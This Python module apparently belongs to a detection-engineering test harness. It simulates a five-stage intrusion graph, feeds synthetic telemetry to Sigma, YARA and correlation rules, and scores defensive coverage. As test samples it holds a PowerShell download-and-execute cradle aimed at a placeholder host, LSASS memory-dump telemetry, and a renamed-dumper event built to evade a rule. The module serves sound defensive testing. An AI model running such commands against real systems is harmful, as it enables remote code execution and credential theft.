"""EPIC 2 — Multi-stage telemetry correlation state machine.

Upgrades the linear kill-chain simulation into a directed acyclic graph (DAG)
state machine. Each node is a lifecycle stage with a primary detection analytic;
edges carry the intrusion timeline forward. When a primary analytic is evaded,
the engine branches to an adjacent *secondary telemetry path* (a compensating
control built on correlated multi-event data) to verify whether a downstream
alert still fires — the essence of defense in depth.

Quantitative scoring produced per walk:
    * Depth-of-Defense (DoD) score  — weighted coverage across all layers.
    * Mean Time-to-Detect (MTTD)    — simulated seconds to first interception.
    * Path-to-Objective containment — whether any layer contained the intrusion.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

from .detectors import SigmaDetector, YaraDetector
from .evaluator import MultiEventEvaluator
from .models import (
    CorrelationResult,
    CorrelationRule,
    CorrelationStage,
    EventSequence,
    GraphWalkResult,
    NodeVisit,
    Variant,
)
from .prompt_engine import PromptEngine
from .telemetry_generator import TelemetryGenerator

ROOT = Path(__file__).resolve().parents[2]

#: Defense-in-depth weighting: earlier layers carry more containment value.
_LAYER_WEIGHTS: Tuple[float, ...] = (1.0, 0.8, 0.6, 0.4, 0.2)
#: Secondary (compensating) telemetry detections count at a discounted weight.
_SECONDARY_DISCOUNT = 0.5
#: Simulated seconds of adversary dwell between successive lifecycle stages.
_STAGE_DWELL_SECONDS = 60.0


@dataclass
class GraphNode:
    """A single stage in the intrusion DAG."""

    node_id: str
    stage_name: str
    technique_id: str
    telemetry_kind: str  # "yara" | "sigma" | "correlation"
    depth: int = 0
    is_secondary: bool = False
    secondary_for: Optional[str] = None


@dataclass
class GraphEdge:
    """A directed transition between two nodes."""

    src: str
    dst: str
    kind: str = "primary"  # "primary" | "on_evasion" | "rejoin"


@dataclass
class DetectionGraph:
    """A directed acyclic graph of lifecycle nodes and their transitions."""

    name: str
    nodes: Dict[str, GraphNode] = field(default_factory=dict)
    edges: List[GraphEdge] = field(default_factory=list)
    start: str = ""
    objective: str = ""
    primary_order: List[str] = field(default_factory=list)

    def add_node(self, node: GraphNode) -> "DetectionGraph":
        self.nodes[node.node_id] = node
        return self

    def add_edge(self, edge: GraphEdge) -> "DetectionGraph":
        self.edges.append(edge)
        return self

    def secondary_of(self, node_id: str) -> Optional[str]:
        """Returns the ``on_evasion`` branch target for *node_id*, if any."""
        for edge in self.edges:
            if edge.src == node_id and edge.kind == "on_evasion":
                return edge.dst
        return None

    def validate_acyclic(self) -> None:
        """Raises ``ValueError`` if the graph contains a cycle (must be a DAG)."""
        color: Dict[str, int] = {n: 0 for n in self.nodes}  # 0=unseen,1=active,2=done
        adjacency: Dict[str, List[str]] = {n: [] for n in self.nodes}
        for edge in self.edges:
            adjacency.setdefault(edge.src, []).append(edge.dst)

        def visit(node: str) -> None:
            color[node] = 1
            for nxt in adjacency.get(node, []):
                if color.get(nxt, 0) == 1:
                    raise ValueError(f"Cycle detected through edge {node} -> {nxt}; graph must be acyclic.")
                if color.get(nxt, 0) == 0:
                    visit(nxt)
            color[node] = 2

        for node in list(self.nodes):
            if color[node] == 0:
                visit(node)


class GraphEngine:
    """Walks a :class:`DetectionGraph`, generating telemetry and scoring coverage."""

    def __init__(self, repo_root: Optional[Path] = None) -> None:
        self.repo_root = repo_root or ROOT
        self.prompt_engine = PromptEngine()
        self.telemetry = TelemetryGenerator()
        self.correlator = MultiEventEvaluator()

        rules = self.repo_root / "rules"
        self._yara = YaraDetector(rule_path=rules / "yara" / "suspicious_active_content_svg.yar")
        self._sigma: Dict[str, SigmaDetector] = {
            "execution": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"),
            "defense_impairment": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_defense_evasion_tampering.yml"),
            "credential": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_rundll32_lsass_dump.yml"),
            "persistence": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_schtasks_persistence.yml"),
        }
        corr_dir = "rules/sigma/correlation"
        self._scriptblock_corr = CorrelationRule(
            name="Execution via Proxy LOLBin (Script Block Correlation)",
            technique_id="T1059.001",
            timespan_seconds=120,
            ordered=False,
            stages=[
                CorrelationStage(
                    name="script_block_download_cradle",
                    technique_id="T1059.001",
                    rule_path=f"{corr_dir}/posh_script_block_download_cradle.yml",
                    event_id=4104,
                ),
            ],
        )
        self._lsass_corr = CorrelationRule(
            name="LSASS Theft (Process Access + Dump File Correlation)",
            technique_id="T1003.001",
            timespan_seconds=120,
            ordered=True,
            stages=[
                CorrelationStage(
                    name="lsass_process_access",
                    technique_id="T1003.001",
                    rule_path=f"{corr_dir}/sysmon_process_access_lsass.yml",
                    event_id=10,
                ),
                CorrelationStage(
                    name="lsass_dump_file_write",
                    technique_id="T1003.001",
                    rule_path=f"{corr_dir}/sysmon_file_create_lsass_dump.yml",
                    event_id=11,
                ),
            ],
        )

    # -- graph construction ----------------------------------------------

    def build_default_graph(self) -> DetectionGraph:
        """Constructs the canonical 5-stage intrusion DAG with two secondary branches."""
        graph = DetectionGraph(name="Stealer-Lure-Intrusion", start="ingress", objective="persistence")
        primary = [
            GraphNode("ingress", "Initial Access", "T1566.001", "yara", depth=0),
            GraphNode("execution", "Execution", "T1204.002", "sigma", depth=1),
            GraphNode("defense_impairment", "Defense Impairment", "T1562.001", "sigma", depth=2),
            GraphNode("credential_telemetry", "Credential Telemetry", "T1003.001", "sigma", depth=3),
            GraphNode("persistence", "Persistence", "T1053.005", "sigma", depth=4),
        ]
        for node in primary:
            graph.add_node(node)
        graph.primary_order = [n.node_id for n in primary]
        for src, dst in zip(graph.primary_order, graph.primary_order[1:]):
            graph.add_edge(GraphEdge(src, dst, "primary"))

        # Secondary compensating-control telemetry paths.
        graph.add_node(
            GraphNode("execution_scriptblock", "Execution (Script Block)", "T1059.001", "correlation",
                      depth=1, is_secondary=True, secondary_for="execution")
        )
        graph.add_edge(GraphEdge("execution", "execution_scriptblock", "on_evasion"))
        graph.add_edge(GraphEdge("execution_scriptblock", "defense_impairment", "rejoin"))

        graph.add_node(
            GraphNode("credential_procaccess", "Credential (Process Access)", "T1003.001", "correlation",
                      depth=3, is_secondary=True, secondary_for="credential_telemetry")
        )
        graph.add_edge(GraphEdge("credential_telemetry", "credential_procaccess", "on_evasion"))
        graph.add_edge(GraphEdge("credential_procaccess", "persistence", "rejoin"))

        graph.validate_acyclic()
        return graph

    # -- walk -------------------------------------------------------------

    def walk(
        self,
        graph: Optional[DetectionGraph] = None,
        evasion_at: Optional[List[str]] = None,
        walk_id: str = "WALK-2026-001",
        on_visit: Optional[Callable[[NodeVisit], None]] = None,
    ) -> GraphWalkResult:
        """Executes one traversal of *graph*, branching on evasion, and scores it."""
        graph = graph or self.build_default_graph()
        evasive = set(evasion_at or [])
        visits: List[NodeVisit] = []

        intercepted = False
        interception_node: Optional[str] = None
        interception_technique: Optional[str] = None
        mttd: Optional[float] = None

        for order_index, node_id in enumerate(graph.primary_order):
            node = graph.nodes[node_id]
            t_offset = order_index * _STAGE_DWELL_SECONDS
            detected, detail = self._evaluate_node(node, evasive=node_id in evasive)
            visit = NodeVisit(
                node_id=node.node_id,
                stage_name=node.stage_name,
                technique_id=node.technique_id,
                telemetry_kind=node.telemetry_kind,
                detected=detected,
                is_secondary=False,
                t_offset_seconds=t_offset,
                evasion_gap=not detected,
                detail=detail,
            )
            visits.append(visit)
            if on_visit:
                on_visit(visit)
            if detected and not intercepted:
                intercepted, interception_node, interception_technique, mttd = (
                    True, node.node_id, node.technique_id, t_offset,
                )

            # Branch to the adjacent secondary telemetry path on a primary miss.
            if not detected:
                secondary_id = graph.secondary_of(node_id)
                if secondary_id is not None:
                    sec_node = graph.nodes[secondary_id]
                    sec_detected, sec_detail = self._evaluate_node(sec_node, evasive=False)
                    sec_offset = t_offset + _STAGE_DWELL_SECONDS / 2.0
                    sec_visit = NodeVisit(
                        node_id=sec_node.node_id,
                        stage_name=sec_node.stage_name,
                        technique_id=sec_node.technique_id,
                        telemetry_kind=sec_node.telemetry_kind,
                        detected=sec_detected,
                        is_secondary=True,
                        t_offset_seconds=sec_offset,
                        evasion_gap=not sec_detected,
                        detail=sec_detail,
                    )
                    visits.append(sec_visit)
                    if on_visit:
                        on_visit(sec_visit)
                    if sec_detected and not intercepted:
                        intercepted, interception_node, interception_technique, mttd = (
                            True, sec_node.node_id, sec_node.technique_id, sec_offset,
                        )

        dod = self._depth_of_defense(graph, visits)
        reached_objective = not intercepted  # uncontained breach reaches the objective

        return GraphWalkResult(
            graph_name=graph.name,
            walk_id=walk_id,
            visits=visits,
            intercepted=intercepted,
            interception_node=interception_node,
            interception_technique=interception_technique,
            depth_of_defense_score=round(dod, 4),
            mttd_seconds=mttd,
            reached_objective=reached_objective,
            contained=intercepted,
        )

    def run_walks(
        self,
        iterations: int = 5,
        graph: Optional[DetectionGraph] = None,
        walk_callback: Optional[Callable[[int, GraphWalkResult], None]] = None,
    ) -> List[GraphWalkResult]:
        """Runs *iterations* walks with rotating adversary evasion profiles."""
        graph = graph or self.build_default_graph()
        evasion_profiles: List[List[str]] = [
            [],
            ["execution"],
            ["credential_telemetry"],
            ["execution", "credential_telemetry"],
            ["ingress"],
            ["ingress", "execution", "credential_telemetry"],
        ]
        results: List[GraphWalkResult] = []
        for i in range(1, iterations + 1):
            profile = evasion_profiles[(i - 1) % len(evasion_profiles)]
            result = self.walk(graph=graph, evasion_at=profile, walk_id=f"WALK-2026-{i:03d}")
            results.append(result)
            if walk_callback:
                walk_callback(i, result)
        return results

    # -- node evaluation --------------------------------------------------

    def _evaluate_node(self, node: GraphNode, evasive: bool) -> Tuple[bool, str]:
        """Generates telemetry for *node* and evaluates its detection analytic."""
        if node.telemetry_kind == "yara":
            return self._evaluate_ingress(evasive)
        if node.telemetry_kind == "correlation":
            return self._evaluate_secondary(node)
        return self._evaluate_sigma(node, evasive)

    def _evaluate_ingress(self, evasive: bool) -> Tuple[bool, str]:
        if evasive:
            prompt = "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"
        else:
            prompt = "SVG image redirecting on load via location.replace to auth.stage.invalid"
        variant = self.prompt_engine.generate_from_prompt(prompt, target_type="yara")
        result = self._yara.evaluate(variant)
        return result.detected, result.details

    def _evaluate_sigma(self, node: GraphNode, evasive: bool) -> Tuple[bool, str]:
        if node.node_id == "execution":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(2, evasive=evasive)
            result = self._sigma["execution"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "defense_impairment":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(3, evasive=evasive)
            result = self._sigma["defense_impairment"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "credential_telemetry":
            variant = self._credential_variant(evasive)
            result = self._sigma["credential"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "persistence":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(5, evasive=evasive)
            result = self._sigma["persistence"].evaluate(variant)
            return result.detected, result.details
        raise ValueError(f"No Sigma analytic wired for node '{node.node_id}'.")

    def _credential_variant(self, evasive: bool) -> Variant:
        """Builds a credential-access process-creation event.

        The evasive form uses a renamed tool with no ``comsvcs``/``MiniDump`` tokens,
        genuinely bypassing the process-creation LSASS rule so the secondary
        process-access correlation path can demonstrate compensating coverage.
        """
        if evasive:
            payload = {
                "EventID": 1,
                "UtcTime": "2026-09-03 14:03:00.000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                "CommandLine": "svc_host.exe --collect 624 C:\\Users\\analyst\\AppData\\Local\\Temp\\out.bin",
                "User": "NT AUTHORITY\\SYSTEM",
            }
            return Variant(id="cred-evasive", target_type="sigma", axis="renamed_tool",
                           mutation_name="lsass_renamed_dumper", description="Renamed LSASS dumper",
                           payload=payload, cycle=1)
        _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(4, evasive=False)
        return variant

    def _evaluate_secondary(self, node: GraphNode) -> Tuple[bool, str]:
        """Evaluates a secondary compensating-control correlation analytic."""
        self.telemetry.reset_timeline()
        if node.node_id == "execution_scriptblock":
            seq = EventSequence(sequence_id="exec-scriptblock", description="Deobfuscated download cradle")
            seq.add(self.telemetry.script_block(
                "$c = New-Object Net.WebClient; IEX $c.DownloadString('https://cdn.delivery.stage.invalid/update.ps1')"
            ))
            result: CorrelationResult = self.correlator.evaluate_correlation(self._scriptblock_corr, seq)
            return result.matched, result.details
        if node.node_id == "credential_procaccess":
            seq = EventSequence(sequence_id="cred-procaccess", description="LSASS access + dump write")
            seq.add(self.telemetry.process_access(
                source_image="C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                target_image="C:\\Windows\\System32\\lsass.exe",
                granted_access="0x1010",
            ))
            seq.add(self.telemetry.file_create(
                image_path="C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                target_filename="C:\\Users\\analyst\\AppData\\Local\\Temp\\out.bin",
            ))
            result = self.correlator.evaluate_correlation(self._lsass_corr, seq)
            return result.matched, result.details
        raise ValueError(f"No correlation analytic wired for node '{node.node_id}'.")

    # -- scoring ----------------------------------------------------------

    @staticmethod
    def _depth_of_defense(graph: DetectionGraph, visits: List[NodeVisit]) -> float:
        """Computes the normalized Depth-of-Defense score across all visited layers."""
        total_weight = sum(_LAYER_WEIGHTS[: len(graph.primary_order)])
        earned = 0.0
        for visit in visits:
            depth = graph.nodes[visit.node_id].depth
            weight = _LAYER_WEIGHTS[depth] if depth < len(_LAYER_WEIGHTS) else 0.1
            if visit.detected:
                earned += weight * (_SECONDARY_DISCOUNT if visit.is_secondary else 1.0)
        if total_weight <= 0:
            return 0.0
        return min(earned / total_weight, 1.0)
